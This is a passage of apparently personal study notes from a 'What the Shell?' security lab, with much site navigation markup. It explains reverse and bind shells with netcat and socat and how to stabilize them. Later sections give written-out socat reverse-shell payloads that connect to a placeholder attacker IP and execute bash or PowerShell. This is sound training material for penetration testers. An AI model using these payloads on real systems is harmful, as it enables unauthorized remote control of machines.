+    <li class="md-nav__item">
+      <a href="../blue/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Blue
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../commandinjection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Command Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../commonlinuxprivesc/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Common Linux Privesc
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crosssitescripting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cross-site Scripting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../fileinclusion/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File Inclusion
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hydra/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hydra
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../idor/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    IDOR
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../johntheripper/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    John the Ripper
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../kenobi/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kenobi
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linuxprivesc/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux PrivEsc
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploitexploitation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit - Exploitation
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploitmeterpreter/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit - Meterpreter
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../motherssecret/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Mother's Secret
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../owaspjuiceshop/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OWASP Juice Shop
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../owasptop10_2021/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OWASP Top 10 - 2021
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../picklerick/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pickle Rick
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqlinjection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqlinjectionlab/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection Lab
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssrf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSRF
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../steelmountain/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Steel Mountain
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../subdomainenumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Subdomain Enumeration
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../traverse/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Traverse
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../uploadvulnerabilities/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Upload Vulnerabilities
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vulnversity/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Vulnversity
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    What the Shell?
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    What the Shell?
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#additional-resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Additional Resources
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-1-what-is-a-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 1 - What is a shell?
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-2-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 2 - Tools
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 2 - Tools">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#netcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Netcat
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#socat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Socat
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#metasploit-multihandler" class="md-nav__link">
+    <span class="md-ellipsis">
+      Metasploit - multi/handler
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#msfvenom" class="md-nav__link">
+    <span class="md-ellipsis">
+      Msfvenom
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#other-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Other Tools
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-3-types-of-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 3 - Types of Shell
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-4-netcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 4 - Netcat
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 4 - Netcat">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reverse-shells" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reverse Shells
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bind-shells" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bind Shells
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-5-netcat-shell-stabilization" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 5 - Netcat Shell Stabilization
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 5 - Netcat Shell Stabilization">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#python" class="md-nav__link">
+    <span class="md-ellipsis">
+      Python
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rlwrap" class="md-nav__link">
+    <span class="md-ellipsis">
+      rlwrap
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#socat_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Socat
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-6-socat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 6 - Socat
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 6 - Socat">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reverse-shells_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reverse Shells
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bind-shells_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bind Shells
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-7-socat-encrypted-shells" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 7 - Socat Encrypted Shells
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-8-common-shell-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 8 - Common Shell Payloads
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-9-msfvenom" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 9 - Msfvenom
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 9 - Msfvenom">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#staged-vs-stageless" class="md-nav__link">
+    <span class="md-ellipsis">
+      Staged vs Stageless
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-10-metasploit-multihandler" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 10 - Metasploit multi/handler
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-11-webshells" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 11 - WebShells
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tasks-12-15" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tasks 12-15
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#additional-resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Additional Resources
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-1-what-is-a-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 1 - What is a shell?
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-2-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 2 - Tools
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 2 - Tools">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#netcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Netcat
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#socat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Socat
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#metasploit-multihandler" class="md-nav__link">
+    <span class="md-ellipsis">
+      Metasploit - multi/handler
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#msfvenom" class="md-nav__link">
+    <span class="md-ellipsis">
+      Msfvenom
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#other-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Other Tools
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-3-types-of-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 3 - Types of Shell
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-4-netcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 4 - Netcat
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 4 - Netcat">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reverse-shells" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reverse Shells
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bind-shells" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bind Shells
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-5-netcat-shell-stabilization" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 5 - Netcat Shell Stabilization
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 5 - Netcat Shell Stabilization">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#python" class="md-nav__link">
+    <span class="md-ellipsis">
+      Python
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rlwrap" class="md-nav__link">
+    <span class="md-ellipsis">
+      rlwrap
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#socat_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Socat
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-6-socat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 6 - Socat
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 6 - Socat">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reverse-shells_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reverse Shells
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bind-shells_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bind Shells
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-7-socat-encrypted-shells" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 7 - Socat Encrypted Shells
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-8-common-shell-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 8 - Common Shell Payloads
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-9-msfvenom" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 9 - Msfvenom
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 9 - Msfvenom">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#staged-vs-stageless" class="md-nav__link">
+    <span class="md-ellipsis">
+      Staged vs Stageless
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-10-metasploit-multihandler" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 10 - Metasploit multi/handler
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-11-webshells" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 11 - WebShells
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tasks-12-15" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tasks 12-15
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  <h1>What the Shell?</h1>
+
+<h2 id="additional-resources">Additional Resources<a class="headerlink" href="#additional-resources" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Payloads All the Things</a></li>
+<li><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheatsheet</a></li>
+<li><a href="https://www.revshells.com/">Reverse Shell Generator</a></li>
+</ul>
+<h2 id="task-1-what-is-a-shell">Task 1 - What is a shell?<a class="headerlink" href="#task-1-what-is-a-shell" title="Permanent link">&para;</a></h2>
+<p>In its simplest form, shells are what we use when interfacing with a Command Line environment (CLI). The common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows.</p>
+<h2 id="task-2-tools">Task 2 - Tools<a class="headerlink" href="#task-2-tools" title="Permanent link">&para;</a></h2>
+<p>There are a variety of tools that can be used to receive reverse shells and to send bind shells.</p>
+<h3 id="netcat">Netcat<a class="headerlink" href="#netcat" title="Permanent link">&para;</a></h3>
+<p>Netcat is the "Swiss Army Knife" of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, receive reverse shells, and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable by default but there are techniques to stabalize the shell (more below).</p>
+<h3 id="socat">Socat<a class="headerlink" href="#socat" title="Permanent link">&para;</a></h3>
+<p>Socat is essentially Netcat on steroids. It can do everything Netcat can and much more. Socat shells are usually more stable out of the box. It should be noted that when compared to Netcat:
+- Socat's syntax is more difficult.
+- Netcat is installed on virtually every Linux distro by default while Socat is rarely installed by default.</p>
+<h3 id="metasploit-multihandler">Metasploit - multi/handler<a class="headerlink" href="#metasploit-multihandler" title="Permanent link">&para;</a></h3>
+<p>The <code>auxiliar/multi/handler</code> module of Metasploit Framework is used to receive reverse shells. Due to being part of Metasploit Framework, multi/handler provides a fully-fledged way to obtain stable shells. It is also the only way to interact with a Meterpreter shell and is the easiest way to handle staged payloads.</p>
+<h3 id="msfvenom">Msfvenom<a class="headerlink" href="#msfvenom" title="Permanent link">&para;</a></h3>
+<p>Like multi/handler, msfvenom is technically part of the Metasploit Framework but is shipped as a standalone tool and can be used to generate payloads on the fly.</p>
+<h3 id="other-tools">Other Tools<a class="headerlink" href="#other-tools" title="Permanent link">&para;</a></h3>
+<p>Beside the tools listed above, there are repositories of shells in many different programming languages. Two of the most prominent are <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Payloads All the Things</a> and <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheatsheet</a>.</p>
+<p>Online generators such as <a href="https://www.revshells.com/">Reverse Shell Generator</a> can make generating code for shells a trivial task.</p>
+<p>Kali also comes pre-installed with a variety of webshells located at <code>/usr/share/webshells</code> and <code>/usr/share/seclists/Web-Shells</code>.</p>
+<h2 id="task-3-types-of-shell">Task 3 - Types of Shell<a class="headerlink" href="#task-3-types-of-shell" title="Permanent link">&para;</a></h2>
+<p>The following are two types of shells which are useful when exploiting a target:
+- <strong>Reverse Shells</strong>: Require the remote target to execute code that connects back to your computer. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target. The main drawback to reverse shells is that when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell (ie: port forwarding).
+- <strong>Bind Shells</strong>: Requires the remote target to execute code to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network but may be prevented by firewalls protecting the target. Note that port forwarding on the remote host would be required when connecting to the shell from the internet.</p>
+<p>As a general rule, reverse shells are easier to execute and debug.</p>
+<p>Shells can be either interactive or non-interactive:
+- <strong>Interactive Shells</strong>: These shells allow you to interact with programs after executing them.
+- <strong>Non-Interactive Shells</strong>: In these shells you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, majority of simple reverse and bind shells are non-interactive.</p>
+<h2 id="task-4-netcat">Task 4 - Netcat<a class="headerlink" href="#task-4-netcat" title="Permanent link">&para;</a></h2>
+<p>Netcat is the most basic took in a pentester's toolkit.</p>
+<h3 id="reverse-shells">Reverse Shells<a class="headerlink" href="#reverse-shells" title="Permanent link">&para;</a></h3>
+<p>There are many ways to execute a shell. Let's start by looking at listeners. The syntax for starting a Netcat listener using Linux is as follows:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="go">nc -lvnp &lt;port-number&gt;</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="gp"># </span>-l<span class="w"> </span>is<span class="w"> </span>used<span class="w"> </span>to<span class="w"> </span>tell<span class="w"> </span>Netcat<span class="w"> </span>that<span class="w"> </span>this<span class="w"> </span>will<span class="w"> </span>be<span class="w"> </span>a<span class="w"> </span>listener.
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="gp"># </span>-v<span class="w"> </span>is<span class="w"> </span>used<span class="w"> </span>to<span class="w"> </span>request<span class="w"> </span>a<span class="w"> </span>verbose<span class="w"> </span>output.
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="gp"># </span>-n<span class="w"> </span>tells<span class="w"> </span>Netcat<span class="w"> </span>not<span class="w"> </span>to<span class="w"> </span>resolve<span class="w"> </span>host<span class="w"> </span>names<span class="w"> </span>or<span class="w"> </span>use<span class="w"> </span>DNS.
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="gp"># </span>-p<span class="w"> </span>indicates<span class="w"> </span>that<span class="w"> </span>the<span class="w"> </span>port<span class="w"> </span>specification<span class="w"> </span>will<span class="w"> </span>follow.
+</code></pre></div>
+Note that if you use a port number below 1024, you will need to use <code>sudo</code> when starting the listener. It is generally a good idea to use a well-known port number (80, 443, or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.</p>
+<h3 id="bind-shells">Bind Shells<a class="headerlink" href="#bind-shells" title="Permanent link">&para;</a></h3>
+<p>A bind shell on a target requires that there is already a listener waiting on a chosen port of the target. All we need to do is then connect to it. The syntax for this is as follows:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="go">nc &lt;target-ip&gt; &lt;chosen-port&gt;</span>
+</code></pre></div>
+Here we are using Netcat to make an outbound connection to the target on our chosen port.</p>
+<h2 id="task-5-netcat-shell-stabilization">Task 5 - Netcat Shell Stabilization<a class="headerlink" href="#task-5-netcat-shell-stabilization" title="Permanent link">&para;</a></h2>
+<p>As mentioned previously, Netcat shells are unstable by default. These shells are non-interactive and often have formatting errors. This is due to Netcat shells being processes running inside a terminal. There are many ways to stabilize Netcat shells on Linux systems. Let's look at three common techniques.</p>
+<h3 id="python">Python<a class="headerlink" href="#python" title="Permanent link">&para;</a></h3>
+<p>Most Linux machines typically have Python installed by default. This is three stage process:
+1. Use <code>python -c 'import pty;pty.spawn("/bin/bash")</code>, which uses Python to spawn a better featured bash shell. At this point our shell will look a little "prettier" but we won't be able to use TAB autocomplete or the arrow keys. CTRL+C will kill the shell.
+2. Use <code>export TERM=xterm</code>. This will give us access to term commands such as <code>clear</code>.
+3. Finally, background the shell using CTRL+Z. Back in our own terminal use <code>stty raw -echo; fg</code>. This turns off our own terminal echo (which gives us access to tab autocomplete, arrow keys, and CTRL+C to kill processes). It then foregrounds the remote shell thereby completing the process.</p>
+<p>See [[cheatsheets.shellstabilisation]].</p>
+<p>Note that if the shell dies or the session is closed, any input in your own terminal will not be visible due to the <code>-echo</code> command. To fix this, simply type <code>reset</code> and press the ENTER key.</p>
+<h3 id="rlwrap">rlwrap<a class="headerlink" href="#rlwrap" title="Permanent link">&para;</a></h3>
+<p>rlwrap is a program which gives us access to history, TAB autocomplete and arrow keys immediately upon receiving a shell. Some manual stabilization is still required to use CTRL+C inside the shell though.</p>
+<p>rlwrap is not installed by default on Linux and needs to be installed using the packet manager for the distribution (ie: <code>sudo apt install rlwrap</code>).</p>
+<p>To use wlwrap, the listener needs to be invoked as follows:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="go">rlwrap nc -lvnp &lt;port-number&gt;</span>
+</code></pre></div>
+By prepending our Netcat listener with "rlwrap", we are able to receive a more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise very difficult to stabilize.</p>
+<h3 id="socat_1">Socat<a class="headerlink" href="#socat_1" title="Permanent link">&para;</a></h3>
+<p>The third easiest way to stabilize a shell is to quite simply use an initial Netcat shell as a stepping stone into a more fully-featured Socat shell.</p>
+<p>Note that this technique is limited to Linux targets only as Socat on Windows is as unstable as a Netcat shell.</p>
+<p>We utilize this, we are required to first transfer a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">Socat static compiled binary</a> onto the target machine. A Python HTTP server can be used to host the file. The Netcat shell on the target can then be used to download the file.</p>
+<h2 id="task-6-socat">Task 6 - Socat<a class="headerlink" href="#task-6-socat" title="Permanent link">&para;</a></h2>
+<p>The easiest way to thing about Socat is as a connector between two points. All Socat does is provide a link between two points.</p>
+<h3 id="reverse-shells_1">Reverse Shells<a class="headerlink" href="#reverse-shells_1" title="Permanent link">&para;</a></h3>
+<p>The following is the syntax for a basic reverse shell listener in Socat:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="go">Socat TCP-L:&lt;port-number&gt; -</span>
+</code></pre></div>
+On Windows, the command to connect back is as follows:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="go">socat TCP:&lt;Local-IP&gt;:&lt;Local-Port&gt; EXEC:powershell.exe,pipes</span>
+</code></pre></div>
+The "pipes" option is used to force Powershell (or cmd.exe) to use Unix style standard input and output.</p>
+<p>The equivalent command for a Linux target is as follows:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="go">socat TCP:&lt;Local-IP&gt;:&lt;Local-Port&gt; EXEC:&quot;bash -li&quot;</span>
+</code></pre></div>
+The above commands are for very basic Socat listeners and payloads. A more advanced listener and payload can be setup when targeting a Linux machine with the following syntax:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="go">socat TCP-L:&lt;Port-Number&gt; FILE:`tty`,raw,echo=0</span>
+</code></pre></div>
+In the above listener command, we are passing in the current TTY as a file and setting the echo to be zero. This is similar to using CTRL+Z,<code>stty raw -echo; fg</code> trick with Netcat shells but with the added bonus of being able to immediately stabilize and hook into a full TTY.</p>
+<p>The advanced listener can be connected with any payload; however, the following payload is very useful when targeting Linux machines:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="go">socat TCP:&lt;Attacker-IP&gt;:&lt;Attacker-Port&gt; EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
